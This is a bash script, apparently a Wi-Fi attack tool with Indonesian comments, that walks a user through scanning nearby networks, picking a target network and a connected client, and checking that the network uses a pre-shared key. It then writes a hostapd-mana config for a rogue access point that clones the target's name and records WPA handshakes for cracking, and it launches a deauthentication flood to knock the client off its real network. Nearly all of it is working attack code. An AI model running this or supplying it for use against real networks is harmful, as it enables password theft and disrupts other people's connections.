#!/bin/bash
slow_echo() {
    text="$1"
    delay="$2" # waktu penundaan dalam detik
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:i:1}"
        sleep "$delay"
    done
    echo
}

cat <<\EOF

#       ..                 .                      ...     ..                           ..       ..              
#    :**888H: `: .xH""    @88>                 .=*8888x <"?88h.                  x .d88"  x .d88"    ..         
#   X   `8888k XX888      %8P      .u    .    X>  '8888H> '8888      x.    .      5888R    5888R    @L          
#  '8hx  48888 ?8888       .     .d88B :@8c  '88h. `8888   8888    .@88k  z88u    '888R    '888R   9888i   .dL  
#  '8888 '8888 `8888     .@88u  ="8888f8888r '8888 '8888    "88>  ~"8888 ^8888     888R     888R   `Y888k:*888. 
#   %888>'8888  8888    ''888E`   4888>'88"   `888 '8888.xH888x.    8888  888R     888R     888R     888E  888I 
#     "8 '888"  8888      888E    4888> '       X" :88*~  `*8888>   8888  888R     888R     888R     888E  888I 
#    .-` X*"    8888      888E    4888>       ~"   !"`      "888>   8888  888R     888R     888R     888E  888I 
#      .xhx.    8888      888E   .d888L .+     .H8888h.      ?88    8888 ,888B .   888R     888R     888E  888I 
#    .H88888h.~`8888.>    888&   ^"8888*"     :"^"88888h.    '!    "8888Y 8888"   .888B .  .888B .  x888N><888' 
#   .~  `%88!` '888*~     R888"     "Y"       ^    "88888hx.+"      `Y"   'YP     ^*888%   ^*888%    "88"  888  
#         `"     ""        ""                        ^"**""                         "%       "%            88F  
#                                                                                                         98"   
#                                                                                                       ./"     
#                                                                                                      ~`       
EOF

# Menampilkan copyright setelah art
slow_echo "(c) Copyright by LTFZP (F.R.I.D.A.Y) 2025" 0.1

# ================== WELCOME MESSAGE ==================

echo -e "\n"
echo "==========================================="
slow_echo " 🧠 Welcome, script kiddies!" 0.1
slow_echo " You better know what you're doing, or this tool will roast you alive." 0.1
slow_echo " Don't cry if you break your Wi-Fi adapter." 0.1
echo "==========================================="
sleep 2

# ================== FUNCTIONS ==================

check_dependencies() {
    local missing=()
    local to_install=()

    declare -A package_map=(
        [iwconfig]="wireless-tools"
        [airodump-ng]="aircrack-ng"
        [aireplay-ng]="aircrack-ng"
        [tshark]="tshark"
        [hostapd]="hostapd"
        [xxd]="vim-common"
    )

    echo "==========================================="
    echo "   📦  Checking Required Dependencies..."
    echo "==========================================="

    for dep in "${!package_map[@]}"; do
        printf "%-25s" "Checking for $dep..."
        if command -v "$dep" &>/dev/null; then
            echo -e "\e[32m[OK]\e[0m"
        else
            echo -e "\e[31m[NOT FOUND]\e[0m"
            missing+=("$dep")
            to_install+=("${package_map[$dep]}")
        fi
        sleep 0.3
    done

    if [ ${#missing[@]} -eq 0 ]; then
        echo ""
        echo "✅ All dependencies are installed. Continuing..."
        sleep 1
    else
        echo ""
        echo "⚠️ Missing ${#missing[@]} dependencies: ${missing[*]}"
        unique_packages=($(printf "%s\n" "${to_install[@]}" | sort -u))

        echo "Packages needed: ${unique_packages[*]}"
        if confirm "Wanna install them like a responsible adult?"; then
            echo ""
            echo "⌛ Updating package list..."
            sudo apt update

            echo ""
            echo "🚀 Installing: ${unique_packages[*]}"
            sudo apt install -y "${unique_packages[@]}"
            
            if [ $? -ne 0 ]; then
                echo "❌ Installation failed. Go fix your internet or sources.list, dummy."
                exit 1
            fi

            echo ""
            echo "✅ All packages installed successfully."
            sleep 1
            clear
        else
            echo "❌ Can't continue without all dependencies. Quitting."
            exit 1
        fi
    fi
}
check_dependencies
# Fungsi konfirmasi y/n
confirm() {
    while true; do
        read -rp "$1 (y/n): " yn
        case $yn in
            [Yy]*) return 0 ;;
            [Nn]*) return 1 ;;
            *) echo "Please answer with y or n." ;;
        esac
    done
}

# Fungsi input angka
get_number_input() {
    local prompt=$1
    local input
    while true; do
        read -rp "$prompt" input
        if [[ $input =~ ^[0-9]+$ ]]; then
            echo "$input"
            return
        else
            echo "Please enter a valid number."
        fi
    done
}
# Fungsi konversi HEX ke ASCII
hex_to_ascii() {
    echo "$1" | xxd -r -p 2>/dev/null
}

# Fungsi membuka terminal baru
launch_terminal() {
    local cmd=$1
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal -- bash -c "$cmd"
    elif command -v konsole &>/dev/null; then
        konsole -e bash -c "$cmd"
    elif command -v xterm &>/dev/null; then
        xterm -e "$cmd"
    elif command -v mate-terminal &>/dev/null; then
        mate-terminal -- bash -c "$cmd"
    elif command -v xfce4-terminal &>/dev/null; then
        xfce4-terminal -- bash -c "$cmd"
    elif command -v tilix &>/dev/null; then
        tilix -e bash -c "$cmd"
    else
        echo "No compatible terminal emulator found."
        exit 1
    fi
}

clear 
cat <<\EOF

#       ..                 .                      ...     ..                           ..       ..              
#    :**888H: `: .xH""    @88>                 .=*8888x <"?88h.                  x .d88"  x .d88"    ..         
#   X   `8888k XX888      %8P      .u    .    X>  '8888H> '8888      x.    .      5888R    5888R    @L          
#  '8hx  48888 ?8888       .     .d88B :@8c  '88h. `8888   8888    .@88k  z88u    '888R    '888R   9888i   .dL  
#  '8888 '8888 `8888     .@88u  ="8888f8888r '8888 '8888    "88>  ~"8888 ^8888     888R     888R   `Y888k:*888. 
#   %888>'8888  8888    ''888E`   4888>'88"   `888 '8888.xH888x.    8888  888R     888R     888R     888E  888I 
#     "8 '888"  8888      888E    4888> '       X" :88*~  `*8888>   8888  888R     888R     888R     888E  888I 
#    .-` X*"    8888      888E    4888>       ~"   !"`      "888>   8888  888R     888R     888R     888E  888I 
#      .xhx.    8888      888E   .d888L .+     .H8888h.      ?88    8888 ,888B .   888R     888R     888E  888I 
#    .H88888h.~`8888.>    888&   ^"8888*"     :"^"88888h.    '!    "8888Y 8888"   .888B .  .888B .  x888N><888' 
#   .~  `%88!` '888*~     R888"     "Y"       ^    "88888hx.+"      `Y"   'YP     ^*888%   ^*888%    "88"  888  
#         `"     ""        ""                        ^"**""                         "%       "%            88F  
#                                                                                                         98"   
#                                                                                                       ./"     
#                                                                                                      ~`       
EOF

# Menampilkan copyright setelah art
echo "(c) Copyright by LTFZP (F.R.I.D.A.Y) 2025"
# 1. Pilih interface wireless
wlan_list=($(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^lo$'))
wlan_count=${#wlan_list[@]}

echo "Detected $wlan_count wireless interfaces:"
for i in "${!wlan_list[@]}"; do
    echo "$i) ${wlan_list[$i]}"
done

if [ "$wlan_count" -eq 1 ]; then
    echo "Only one wireless interface detected: ${wlan_list[0]}"
    if ! confirm "Continue with this interface?"; then
        echo "Operation canceled."
        exit 1
    fi
fi

wlan_index=$(get_number_input "Select interface for scanning (number): ")
TARGET_IFACE="${wlan_list[$wlan_index]}"

echo "Using interface: $TARGET_IFACE"

# 2. Scanning Awal
SCAN_FILE="discovery-initial-$(date +%s)"
echo "Initiating preliminary scan and saving output to pcap: $SCAN_FILE"

launch_terminal "sudo airodump-ng $TARGET_IFACE -w $SCAN_FILE --output-format pcap --manufacturer --wps --band abg"

echo "Press CTRL+C in the scanning terminal when sufficient data is collected."
read -p "Press [ENTER] after completing the initial scan..."

# Ambil file pcap terbaru
initial_pcap=$(ls -t ${SCAN_FILE}-*.cap 2>/dev/null | head -n 1)
if [ -z "$initial_pcap" ]; then
    echo "Failed to retrieve initial pcap file."
    exit 1
fi

# Ambil daftar ESSID unik
echo "Extracting ESSIDs from file: $initial_pcap"
mapfile -t raw_essid_list < <(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && wlan.ssid != \"\"" -T fields -e wlan.ssid | sort -u)

if [ ${#raw_essid_list[@]} -eq 0 ]; then
    echo "No ESSIDs found in the initial scan pcap."
    exit 1
fi

# Decode semua ESSID yang ditemukan
decoded_essid_list=()
for hex_essid in "${raw_essid_list[@]}"; do
    decoded_ssid=$(hex_to_ascii "$hex_essid")
    decoded_essid_list+=("$decoded_ssid")
done

# Tampilkan ke user nama WiFi asli
echo "Discovered ESSIDs:"
for i in "${!decoded_essid_list[@]}"; do
    echo "$i) ${decoded_essid_list[$i]}"
done

# Pilih target
essid_index=$(get_number_input "Select target ESSID (number): ")
TARGET_ESSID="${decoded_essid_list[$essid_index]}"
TARGET_RAW_ESSID="${raw_essid_list[$essid_index]}"

echo "Target ESSID selected: $TARGET_ESSID"
sleep 0.2

clear 

# 3. Cek RSN untuk target ESSID
echo "Checking RSN parameters for target ESSID: $TARGET_ESSID"

# Ambil AKM Suite Type dari PCAP
akms_types=$(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && frame contains \"$TARGET_ESSID\"" -T fields -e wlan.rsn.akms.type 2>/dev/null)

if [[ -z "$akms_types" ]]; then
    echo "❌ No AKM Suite Type found for this SSID."
    exit 1
fi

# Gabungkan semua hasil jadi satu baris
all_types=$(echo "$akms_types" | tr '\n' ',' | tr -s ',' ',' | sed 's/,$//')

echo "AKM Suite Types detected: $all_types"

# Cek apakah ada tipe 2 (PSK) atau 6 (PSK-SHA256)
if echo "$all_types" | grep -E -q "(^|,)2(,|$)|(^|,)6(,|$)"; then
    echo "✅ Target supports PSK or PSK-SHA256. Attack can proceed."
else
    echo "❌ Target only supports SAE. Attack cannot proceed."
    exit 1
fi

# 3.5. Setup Interface untuk Rogue AP dan Monitor Mode
echo ""
echo "Re-examining wireless interfaces for Rogue AP and Monitor configuration..."

wlan_list=($(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^lo$'))
wlan_count=${#wlan_list[@]}

echo "Detected $wlan_count wireless interfaces:"
for i in "${!wlan_list[@]}"; do
    echo "$i) ${wlan_list[$i]}"
done

if [ "$wlan_count" -eq 1 ]; then
    echo "⚠️ Warning: Only one wireless interface available. Attack efficiency may be compromised."
    TARGET_MONITOR_IFACE="${wlan_list[0]}"
    TARGET_AP_IFACE="${wlan_list[0]}"
else
    ap_index=$(get_number_input "Select interface for Rogue AP (number): ")
    mon_index=$(get_number_input "Select interface for Monitor/Deauth (number): ")

    TARGET_AP_IFACE="${wlan_list[$ap_index]}"
    TARGET_MONITOR_IFACE="${wlan_list[$mon_index]}"
fi

echo "Rogue AP Interface: $TARGET_AP_IFACE"
echo "Monitor Interface : $TARGET_MONITOR_IFACE"

# 4. Buat config hostapd-mana
CONFIG_FILE="hostapd-${TARGET_ESSID}.conf"
echo "Creating configuration file: $CONFIG_FILE"

cat > "$CONFIG_FILE" <<EOF
interface=$TARGET_IFACE
driver=nl80211
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ssid=$TARGET_ESSID
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
mana_wpaout=${TARGET_ESSID}-handshake.hccapx
EOF

echo "Configuration successfully created."

# [SETELAH PILIH ESSID, langsung ambil BSSID]
echo "Identifying BSSID for target ESSID..."
TARGET_BSSID=$(tshark -r "$initial_pcap" -Y "wlan.fc.type_subtype == 0x08 && wlan.ssid == \"$TARGET_ESSID\"" -T fields -e wlan.bssid | sort -u | head -n 1)

if [ -z "$TARGET_BSSID" ]; then
    echo "❌ Unable to locate BSSID for target ESSID."
    exit 1
fi

echo "Target BSSID: $TARGET_BSSID"

# 5.1 Scanning Client Potensial
echo "Initiating scan for clients connected to target BSSID..."

CLIENT_SCAN_FILE="client-scan-$(date +%s)"
echo "Beginning client scan and saving output to pcap: $CLIENT_SCAN_FILE"

launch_terminal "sudo airodump-ng $TARGET_MONITOR_IFACE -w $CLIENT_SCAN_FILE --bssid $TARGET_BSSID --output-format pcap --manufacturer --wps --band abg"

echo "Press CTRL+C in the client scanning terminal when sufficient data is collected."
read -p "Press [ENTER] after completing the client scan..."

# Ambil file pcap baru
client_pcap=$(ls -t ${CLIENT_SCAN_FILE}-*.cap 2>/dev/null | head -n 1)

if [[ -z "$client_pcap" ]]; then
    echo "❌ No new client capture file found."
    exit 1
fi

echo "Client pcap file: $client_pcap"

# Parse client list dari pcap
mapfile -t client_list < <(tshark -r "$client_pcap" -Y "(wlan.fc.type_subtype >= 0x20 && wlan.fc.type_subtype <= 0x2f) && wlan.bssid == $TARGET_BSSID" -T fields -e wlan.sa | grep -v "$TARGET_BSSID" | sort -u)

if [ ${#client_list[@]} -eq 0 ]; then
    echo "❌ No clients found connected to target BSSID."
    exit 1
fi

echo "Potential Client List:"
for i in "${!client_list[@]}"; do
    echo "$i) ${client_list[$i]}"
done

client_index=$(get_number_input "Select target client (number): ")
TARGET_CLIENT_MAC="${client_list[$client_index]}"

echo "Target client selected: $TARGET_CLIENT_MAC"

# 6. Jalankan hostapd-mana
echo "Executing hostapd-mana for Rogue AP deployment..."
sudo hostapd-mana "$CONFIG_FILE" -dd &
echo "Run in a new terminal to monitor output with command: sudo hostapd-mana $CONFIG_FILE -dd"

sleep 3

# 7. Deauth target client
echo "Initiating deauthentication attack against target client..."
launch_terminal "sudo aireplay-ng --deauth 1000 -a $TARGET_BSSID -c $TARGET_CLIENT_MAC $TARGET_MONITOR_IFACE"
